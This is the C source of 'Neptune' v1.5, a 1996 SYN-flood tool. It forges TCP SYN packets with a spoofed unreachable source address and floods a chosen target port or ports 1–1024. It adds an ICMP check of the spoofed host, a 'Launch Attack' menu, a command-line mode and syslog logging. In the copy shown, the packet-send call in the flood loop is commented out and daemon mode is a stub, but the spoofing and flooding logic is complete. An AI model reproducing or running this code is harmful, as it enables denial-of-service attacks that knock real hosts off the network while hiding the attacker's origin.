/*
			        Neptune
			        v. 1.5

			daemon9/route/infinity

		      June 1996 Guild productions

	             comments to daemon9@netcom.com
	
	If you found this code alone, without the companion whitepaper
	please get the real-deal:
ftp.infonexus.com/pub/SourceAndShell/Guild/Route/Projects/Neptune/neptune.tgz
	
Brief synopsis:
	Floods the target host with TCP segments with the SYN bit on,
	puportedly from an unreachable host.  The return address in the 
	IP header is forged to be that of a known unreachable host.  The
	attacked TCP, if flooded sufficently, will be unable to respond
	to futher connects.  See the accompanying whitepaper for a full 
	treatment of the topic.  (Also see my paper on IP-spoofing for
	information on a related subject.)

Usage:
	Figure it out, kid.  Menu is default action.  Command line usage is
	available for easy integration into shell scripts.  If you can't
	figure out an unreachable host, the program will not work.

Gripes: 
	It would appear that flooding a host on every port (with the 
	infinity switch) has it's drawbacks.  So many packets are trying to 
	make their way to the target host, it seems as though many are 
	dropped, especially on ethernets.  Across the Internet, though, the 
	problem appears mostly mitigated.  The call to usleep appears to fix 
	this...  Coming up is a port scanning option that will find open 
	ports...

Version History:
6/17/96 beta1:	SYN flooding, Cmd line and crude menu, ICMP stuff broken
6/20/96	beta2:	Better menu, improved SYN flooding, ICMP fixed... sorta
6/21/96	beta3:	Better menu still, fixed SYN flood clogging problem
		Fixed some name-lookup problems
6/22/96	beta4:	Some loop optimization, ICMP socket stuff changed, ICMP
		code fixed
6/23/96 1.0:	First real version...
6/25/96	1.1:	Cleaned up some stuff, added authentication hooks, fixed up
		input routine stuff
7/01/96	1.5:	Added daemonizing routine...

   This coding project made possible by a grant from the Guild corporation

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syslog.h>
#include <pwd.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <time.h>
#include <linux/signal.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/icmp.h>

#define BUFLEN 256
#define MENUBUF	64
#define MAXPORT 1024
#define	MAXPAK 4096		
#define	MENUSLEEP 700000 	
#define	FLOODSLEEP 100		/* Ethernet, or WAN? Yur mileage will vary.*/
#define	ICMPSLEEP 100		
#define ACCESSLIST "/etc/sfaccess.conf"

int HANDLERCODE=1;
int KEEPQUIET=0;
char werd[]={"\nThis code made possible by a grant from the Guild Corporation\n\0"};
 
void main(argc,argv)
int argc;
char *argv[];
{
	
	void usage(char *);
	void menu(int,char *);
	void flood(int,unsigned,unsigned,u_short,int);
	unsigned nameResolve(char *);
	int authenticate(int,char *);	
 
	unsigned unreachable,target;	
	int c,port,amount,sock1,fd;
	struct passwd *passEnt;
	char t[20],u[20];

	if((fd=open(ACCESSLIST,O_RDONLY))<=0){
		perror("Cannot open accesslist");
		exit(1);
	}
	setpwent();
	passEnt=getpwuid(getuid());
	endpwent();
				/* Authenticate */
	if(!authenticate(fd,passEnt->pw_name)){
		fprintf(stderr,"Access Denied, kid\n");
		exit(0);
	}
				/* Open up a RAW socket */

   	if((sock1=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0){
   		perror("\nHmmm.... socket problems\n");
      		exit(1);
   	} 
	if(argc==1){
		menu(sock1,passEnt->pw_name);
		exit(0);
	}
				/* Parse command-line arguments */
	while((c=getopt(argc,argv,"8:s:t:p:a"))){
      		switch(c){
			case 's':	/* Source (spoofed) host */
				unreachable=nameResolve(optarg);
				strcpy(u,optarg);
				break;
			case 't':	/* Target host */
			 	target=nameResolve(optarg);
				strcpy(t,optarg);
				break;
			case 'p':	/* Target port */
				port=atoi(optarg);
				break;
        		case '8':	/* infinity switch */
				port=0;			
				break;
			case 'a':	/* Amount of SYNs to send */
				amount=atoi(optarg);
				break;
        		default:	/* WTF? */
          			usage(argv[0]);
		}
	}    

	if(!port){
		printf("\n\nFlooding target: \t\t%u\nOn ports\t\t\t1-%d\nAmount: \t\t\t%u\nPuportedly from: \t\t%u \n",target,MAXPORT,amount,unreachable); 
	  	flood(sock1,unreachable,target,0,amount);
	}	
	else{
		printf("\n\nFlooding target: \t\t%u\nOn port: \t\t\t%u\nAmount: \t\t\t%u\nPuportedly from: \t\t%u \n",target,port,amount,unreachable); 
   		flood(sock1,unreachable,target,port,amount);
	}
	syslog(LOG_LOCAL6|LOG_INFO,"FLOOD: PID: %d, User:%s Target:%s Unreach:%s Port:%d Number:%d\n",getpid(),passEnt->pw_name,t,u,port,amount);  
	printf(werd);
	exit(0);
}					/* End main */

/*
 * 	Authenticate.  Makes sure user is authorized to run program.
 *
 */
int authenticate(fd,nameID)
int fd;
char *nameID;
{

	char buf[BUFLEN+1];
	char workBuffer[10];
	int i=0,j=0;	

	while(read(fd,buf,sizeof(buf))){
		if(!(strstr(buf,nameID))){
			close(fd);
			syslog(LOG_LOCAL6|LOG_INFO,"Failed authentication for %s\n",nameID);  
			return(0);
		}
		else {
			close(fd);
			syslog(LOG_LOCAL6|LOG_INFO,"Successful start by %s, PID: %d\n",nameID,getpid());  
			return(1);
		}
	}
}


/*
 *	Flood.  This is main workhorse of the program.  IP and TCP header 
 *	construction occurs here, as does flooding.	
 */
void flood(int sock,unsigned sadd,unsigned dadd,u_short dport,int amount){
 
	unsigned short in_cksum(unsigned short *,int);
  
   	struct packet{
      		struct iphdr ip;
      		struct tcphdr tcp;
   	}packet;
   
	struct pseudo_header{		/* For TCP header checksum */
      		unsigned int source_address;
      		unsigned int dest_address;
      		unsigned char placeholder;
      		unsigned char protocol;
      		unsigned short tcp_length;
      		struct tcphdr tcp;
   	}pseudo_header;
 
   	struct sockaddr_in sin;		/* IP address information */
   	register int i=0,j=0;		/* Counters */
	int tsunami=0;			/* flag */
	unsigned short sport=161+getpid();

	if(!dport){
		tsunami++;		/* GOD save them... */
		fprintf(stderr,"\nTSUNAMI!\n");
		fprintf(stderr,"\nflooding port:");	
	}

   			/* Setup the sin struct with addressing information */

   	sin.sin_family=AF_INET;		/* Internet address family */
   	sin.sin_port=sport;		/* Source port */
   	sin.sin_addr.s_addr=dadd;	/* Dest. address */
    			
			/* Packet assembly begins here */

   				/* Fill in all the TCP header information */

   	packet.tcp.source=sport;	/* 16-bit Source port number */
   	packet.tcp.dest=htons(dport); 	/* 16-bit Destination port */
   	packet.tcp.seq=49358353+getpid();	/* 32-bit Sequence Number */
   	packet.tcp.ack_seq=0;		/* 32-bit Acknowledgement Number */
   	packet.tcp.doff=5;		/* Data offset */
	packet.tcp.res1=0;		/* reserved */
	packet.tcp.res2=0;		/* reserved */	
   	packet.tcp.urg=0;		/* Urgent offset valid flag */		
   	packet.tcp.ack=0;		/* Acknowledgement field valid flag */
   	packet.tcp.psh=0;		/* Push flag */
   	packet.tcp.rst=0;		/* Reset flag */
   	packet.tcp.syn=1;		/* Synchronize sequence numbers flag */
   	packet.tcp.fin=0;		/* Finish sending flag */
   	packet.tcp.window=htons(242); /* 16-bit Window size */
   	packet.tcp.check=0;		/* 16-bit checksum (to be filled in below) */
   	packet.tcp.urg_ptr=0;		/* 16-bit urgent offset */
 
   				/* Fill in all the IP header information */
   
   	packet.ip.version=4;		/* 4-bit Version */
	packet.ip.ihl=5;		/* 4-bit Header Length */
   	packet.ip.tos=0;		/* 8-bit Type of service */
   	packet.ip.tot_len=htons(40);	/* 16-bit Total length */
   	packet.ip.id=getpid();		/* 16-bit ID field */
   	packet.ip.frag_off=0;		/* 13-bit Fragment offset */
   	packet.ip.ttl=255;		/* 8-bit Time To Live */
   	packet.ip.protocol=IPPROTO_TCP; /* 8-bit Protocol */
   	packet.ip.check=0;		/* 16-bit Header checksum (filled in below) */
   	packet.ip.saddr=sadd;		/* 32-bit Source Address */
   	packet.ip.daddr=dadd;		/* 32-bit Destination Address */
 
			/* Psuedo-headers needed for TCP hdr checksum (they
			do not change and do not need to be in the loop) */
      		
	pseudo_header.source_address=packet.ip.saddr;
      	pseudo_header.dest_address=packet.ip.daddr;
      	pseudo_header.placeholder=0;
      	pseudo_header.protocol=IPPROTO_TCP;
      	pseudo_header.tcp_length=htons(20);
 
	while(1){			/* Main loop */
		if(tsunami){
			if(j==MAXPORT){
				tsunami=0;
	  			break;
			}
			packet.tcp.dest=htons(++j);
			fprintf(stderr,"%d",j);
			fprintf(stderr,"%c",0x08);
			if(j>=10)fprintf(stderr,"%c",0x08);
			if(j>=100)fprintf(stderr,"%c",0x08);
			if(j>=1000)fprintf(stderr,"%c",0x08);
			if(j>=10000)fprintf(stderr,"%c",0x08);

		}
   		for(i=0;i<amount;i++){	/* Flood loop */

				/* Certian header fields should change */	

      			packet.tcp.source++;	/* Source port inc */
      			packet.tcp.seq++;	/* Sequence Number inc */
      			packet.tcp.check=0;	/* Checksum will need to change */
      			packet.ip.id++;		/* ID number */
      			packet.ip.check=0;	/* Checksum will need to change */
 
      			/* IP header checksum */
      	
			packet.ip.check=in_cksum((unsigned short *)&packet.ip,20);
 
			/* Setup TCP headers for checksum */

      			bcopy((char *)&packet.tcp,(char *)&pseudo_header.tcp,20);

			/* TCP header checksum */

      			packet.tcp.check=in_cksum((unsigned short *)&pseudo_header,32);

			/* As it turns out, if we blast packets too fast, many
		 	get dropped, as the receiving kernel can't cope (at 
			least on an ethernet).  This value could be tweaked
			prolly, but that's up to you for now... */
		
			usleep(FLOODSLEEP);  
		
		/* This is where we sit back and watch it all come together */
      		
			/*sendto(sock,&packet,40,0,(struct sockaddr *)&sin,sizeof(sin));*/
			if(!tsunami&&!KEEPQUIET)fprintf(stderr,".");
   		}	
		if(!tsunami)break;
	}
}
 

/*
 *	IP Family checksum routine (from UNP)
 */
unsigned short in_cksum(unsigned short *ptr,int nbytes){

	register long           sum;            /* assumes long == 32 bits */
        u_short                 oddbyte;
        register u_short        answer;         /* assumes u_short == 16 bits */
 
        /*
         * Our algorithm is simple, using a 32-bit accumulator (sum),
         * we add sequential 16-bit words to it, and at the end, fold back
         * all the carry bits from the top 16 bits into the lower 16 bits.
         */
 
        sum = 0;
        while (nbytes > 1)  {
                sum += *ptr++;
                nbytes -= 2;
        }
 
                                /* mop up an odd byte, if necessary */
        if (nbytes == 1) {
                oddbyte = 0;            /* make sure top half is zero */
                *((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
                sum += oddbyte;
        }
 
        /*
         * Add back carry outs from top 16 bits to low 16 bits.
         */
 
        sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
        sum += (sum >> 16);                     /* add carry */
        answer = ~sum;          /* ones-complement, then truncate to 16 bits */
        return(answer);
}


/*
 *	Converts IP addresses
 */
unsigned nameResolve(char *hostname){

	struct in_addr addr;
   	struct hostent *hostEnt;

   	if((addr.s_addr=inet_addr(hostname))==-1){
     		if(!(hostEnt=gethostbyname(hostname))){
         		fprintf(stderr,"Name lookup failure: `%s`\n",hostname);
         		exit(0);
      		}
      		bcopy(hostEnt->h_addr,(char *)&addr.s_addr,hostEnt->h_length);
   	}
   	return addr.s_addr;
}


/*
 *	Menu function.  Nothing suprising here.  Except that one thing.
 */
void menu(sock1,nameID)
int sock1;
char *nameID;
{
	int slickPing(int,int,char *);
	void flood(int,unsigned,unsigned,u_short,int);
	unsigned nameResolve(char *);
	void demon(int,char *,char *,int,int,int,int);

	int i,sock2,menuLoop=1,icmpAmt,port,amount,interval,ttl;
	char optflags[7]={0};		/* So we can keep track of the options */
	static char tmp[MENUBUF+1]={0},target[MENUBUF+1]={0},unreach[MENUBUF+1]={0};	

	while(menuLoop){		
		printf("\n\n\t\t\t[   SYNflood Menu   ]\n\t\t\t    [  daemon9  ]\n\n");
		if(!optflags[0])printf("1\t\tEnter target host\n");
		else printf("[1]\t\tTarget:\t\t\t%s\n",target);
		if(!optflags[1])printf("2\t\tEnter source (unreachable) host\n");
		else printf("[2]\t\tUnreachable:\t\t%s\n",unreach);
		if(!optflags[2])printf("3\t\tSend ICMP_ECHO(s) to unreachable\n");
		else printf("[3]\t\tUnreachable host:\tverified unreachable\n");
		if(!optflags[3])printf("4\t\tEnter port number to flood\n");
		else if(port)printf("[4]\t\tFlooding:\t\t%d\n",port);
		else printf("[4]\t\tFlooding:\t\t1-1024\n");
		if(!optflags[4])printf("5\t\tEnter number of SYNs\n");
		else printf("[5]\t\tNumber SYNs:\t\t%d\n",amount);
		printf("\n6\t\tQuit\n");
		if(optflags[0]&&optflags[1]&&optflags[3]&&optflags[4])printf("7\t\tLaunch Attack\n");
		if(optflags[0]&&optflags[1]&&optflags[3]&&optflags[4])printf("8\t\tDaemonize\n");
		printf("\n\n\n\n\n\n\n\n\n\n\n\n");
		fgets(tmp,BUFLEN/2,stdin);	/* tempered input */
		switch(atoi(tmp)){
			case 1:	
				printf("[hostname]-> ");
				fgets(target,MENUBUF,stdin);
				i=0;
				if(target[0]=='\n')break;
				while(target[i]!='\n')i++;
				target[i]=0;
				optflags[0]=1;			
				break;
			case 2:
				printf("[hostname]-> ");
				fgets(unreach,MENUBUF,stdin);
				i=0;
				if(unreach[0]=='\n')break;
				while(unreach[i]!='\n')i++;
				unreach[i]=0;
				optflags[1]=1;
				break;
			case 3:
				if(!optflags[1]){
					fprintf(stderr,"Um, enter a host first\n");
					usleep(MENUSLEEP);
					break;
				}
						/* Raw ICMP socket */
   				if((sock2=socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))<0){
   					perror("\nHmmm.... socket problems\n");
      					exit(1);
   				}		
				printf("[number of ICMP_ECHO's]-> ");
				fgets(tmp,MENUBUF,stdin);
				if(!(icmpAmt=atoi(tmp)))break;
				if(slickPing(icmpAmt,sock2,unreach)){
					fprintf(stderr,"Host is reachable... Pick a new one\n");
					sleep(1);
					optflags[1]=0;
					optflags[2]=0;
					HANDLERCODE=1;
					close(sock2);
					break;
				}
				optflags[2]=1;
				close(sock2);
				break;
			case 4: 
				printf("[port number]-> ");
				fgets(tmp,MENUBUF,stdin);
				port=atoi(tmp);
				optflags[3]=1;
				break;
			case 5:
				printf("[number of SYNs]-> ");
				fgets(tmp,MENUBUF,stdin);
				if(!(amount=atoi(tmp)))break;
				optflags[4]=1;
				break;
			case 6:
				menuLoop--;
				break;
			case 7:
				if(optflags[0]&&optflags[1]&&optflags[3]&&optflags[4]){
					syslog(LOG_LOCAL6|LOG_INFO,"FLOOD: PID: %d, User:%s Target:%s Unreach:%s Port:%d Number:%d\n",getpid(),nameID,target,unreach,port,amount);  
					flood(sock1,nameResolve(unreach),nameResolve(target),port,amount);
					menuLoop--;
				}
				else{
					fprintf(stderr,"Illegal option --try again\n");
					usleep(MENUSLEEP);
				}
				break;
			case 8:
				if(optflags[0]&&optflags[1]&&optflags[3]&&optflags[4]){
					if(!port){
						fprintf(stderr,"Cannot set infinity flag in daemon mode.  Sorry.\n");
						usleep(MENUSLEEP*2);
						break;
					}
					printf("[packet sending interval in seconds {80}]-> ");
					fgets(tmp,MENUBUF,stdin);
					if(!(interval=atoi(tmp)))interval=80;
					printf("[time for daemon to live in whole hours(0=forever)]-> ");
					fgets(tmp,MENUBUF,stdin);
					ttl=atoi(tmp);
					syslog(LOG_LOCAL6|LOG_INFO,"DFLOOD: PID: %d, User:%s Target:%s Unreach:%s Port:%d Number:%d Interval: %d TTL: %d\n",getpid(),nameID,target,unreach,port,amount,interval,ttl);  
					demon(sock1,unreach,target,port,amount,interval,ttl);
					exit(0);
				}
				else{
					fprintf(stderr,"Illegal option --try again\n");
					usleep(MENUSLEEP);
				}
				break;
								
			default:
				fprintf(stderr,"Illegal option --try again\n");
				usleep(MENUSLEEP);
		}

	}
	printf("\n");
	printf(werd);
	return;
}


/*
 *	SlickPing.  A quick and dirty ping hack.  Sends <amount> ICMP_ECHO 
 *	packets and waits for a reply on any one of them...  It has to check 
 *	to make sure the ICMP_ECHOREPLY is actually meant for us, as raw ICMP 
 *	sockets get ALL the ICMP traffic on a host, and someone could be 
 *	pinging some other host and we could get that ECHOREPLY and foul 
 *	things up for us.
 */
int slickPing(amount,sock,dest)
int amount,sock;
char *dest;
{

	int alarmHandler();
	unsigned nameResolve(char *);
	
	register int retcode,j=0;
	struct icmphdr *icmp;
	struct sockaddr_in sin;
	unsigned char sendICMPpak[MAXPAK]={0};
	unsigned short pakID=getpid()&0xffff;

	struct ippkt{
   		struct iphdr ip;
   		struct icmphdr icmp;
   		char buffer[MAXPAK];
	}pkt;

	bzero((char *)&sin,sizeof(sin));
	sin.sin_family=AF_INET;
	sin.sin_addr.s_addr=nameResolve(dest);

		/* ICMP Packet assembly  */
	/* We let the kernel create our IP header as it is legit */

	icmp=(struct icmphdr *)sendICMPpak;
	icmp->type=ICMP_ECHO;			/* Requesting an Echo */
	icmp->code=0;				/* 0 for ICMP ECHO/ECHO_REPLY */
	icmp->un.echo.id=pakID;			/* To identify upon return */	
	icmp->un.echo.sequence=0;		/* Not used for us */
	icmp->checksum=in_cksum((unsigned short *)icmp,64);

	fprintf(stderr,"sending ICMP_ECHO packets: ");
	for(;j<amount;j++){
		usleep(ICMPSLEEP);		/* For good measure */
		retcode=sendto(sock,sendICMPpak,64,0,(struct sockaddr *)&sin,sizeof(sin));
		if(retcode<0||retcode!=64)
			if(retcode<0){
				perror("ICMP sendto err");
				exit(1);
			}
			else fprintf(stderr,"Only wrote %d bytes",retcode);
		else fprintf(stderr,".");
	}
	HANDLERCODE=1;
	signal(SIGALRM,alarmHandler);	/* catch the ALARM and handle it */
	fprintf(stderr,"\nSetting alarm timeout for 10 seconds...\n");
	alarm(10);	/* ALARM is set b/c read() will block forever if no */
	while(1){	/* packets arrive...   (which is what we want....)  */
		read(sock,(struct ippkt *)&pkt,MAXPAK-1);
  		if(pkt.icmp.type==ICMP_ECHOREPLY&&icmp->un.echo.id==pakID){
			if(!HANDLERCODE)return(0);
			return(1);
		}
  	}	
}


/* 
 *	SIGALRM signal handler.  Souper simple.
 */ 
int alarmHandler(){

	HANDLERCODE=0;		/* shame on me for using global vars */
	alarm(0);
	signal(SIGALRM,SIG_DFL);
	return(0);
}


/*
 *	Usage function...  
 */
void usage(nomenclature)
char *nomenclature;
{
	fprintf(stderr,"\n\nUSAGE: %s \n\t-s unreachable_host \n\t-t target_host \n\t-p port [-8 (infinity switch)] \n\t-a amount_of_SYNs\n",nomenclature);
      	exit(0);
}


/*
 *	Demon.  Backgrounding procedure and looping stuff.  
 */					

void demon(sock,unreachable,target,port,amount,interval,ttl)
int sock;
char *unreachable;
char *target;
int port;
int amount;
int interval;
int ttl;
{
	fprintf(stderr,"\nSorry Daemon mode not available in this version\n");
	exit(0);

}
